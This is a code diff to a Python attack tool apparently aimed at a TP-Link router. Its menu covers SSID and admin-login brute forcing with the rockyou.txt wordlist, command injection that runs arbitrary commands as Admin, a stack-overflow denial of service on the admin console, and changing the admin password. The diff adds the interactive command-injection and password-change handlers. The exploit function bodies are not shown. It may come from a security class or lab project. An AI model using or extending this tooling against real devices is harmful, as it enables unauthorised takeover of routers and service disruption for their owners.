@@ -14,6 +14,7 @@ ATTACKS = [
     ("Admin Login Brute Force", "Bypass auth rate limiting by brute forcing authorization cookies."),
     ("Command Injection", "Run arbitrary commands as the Admin user. This requires Admin access (Refer to Attack #3)"),
     ("Denial of Service (DoS)",   "Utilize a Stack Overflow to take down the Admin console (Requires physical restart to fix)"),
+    ("Change Admin Password", "Change the Admin password in the web console. This requires Admin access (Refer to Attack #3)"),
     ("Light Show", "Start a light show from the router"),
 ]
 
@@ -276,6 +277,9 @@ def parse_args() -> argparse.Namespace:
     parser.add_argument("-i", "--iface", default="", help="Wireless interface",)
     return parser.parse_args()
 
+def request_url():
+    return "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
+
 def main() -> None:
     check_admin()
     args  = parse_args()
@@ -308,24 +312,42 @@ def main() -> None:
                         ssid_brute(target["SSID"])
                     case 2:
                         if not URL:
-                            URL = "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
+                            URL = request_url()
                         query_admin_status(URL)
                     case 3:
                         password_list = "rockyou.txt"
                         if not URL:
-                            URL = "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
+                            URL = request_url()
                         PASSWORD = brute_force_login(URL, password_list)
                     case 4:
-                        print("Dhruv Kandula")
+                        if not URL:
+                            URL = request_url()
+                        if PASSWORD:
+                            command = str(input("[!] Enter the command you want to be executed:").strip())
+                            command_injection(URL, PASSWORD, command)
+                        else:
+                            password = str(input("[!] Enter the Admin password:").strip())
+                            command = str(input("[!] Enter the command you want to be executed:").strip())
+                            command_injection(URL, password, command)
+
                     case 5:
                         if not IP:
                             IP = str(input("[!] Enter IP of the TP-Link Router:").strip())
                         dos_admin_portal(IP)
                     case 6:
                         if not URL:
-                            URL = "http://" +str(input("[!] Enter URL (IP) for the Admin console:").strip()) + "/"
+                            URL = request_url()
                         if PASSWORD:
-                            print(f"[-] Please get the Admin password before running this attack")
+                            new_pass = str(input("[!] Enter the new password:"))
+                            PASSWORD = change_password(URL, PASSWORD, new_pass)
+                        else:
+                            password = str(input("[!] Enter the Admin password (Current):").strip())
+                            new_pass = str(input("[!] Enter the new password:"))
+                            PASSWORD = change_password(URL, password, new_pass)
+                    case 7:
+                        if not URL:
+                            URL = request_url()
+                        if PASSWORD:
                             lightshow(URL, PASSWORD)
                         else:
                             password = str(input("[!] Enter the Admin password:").strip())
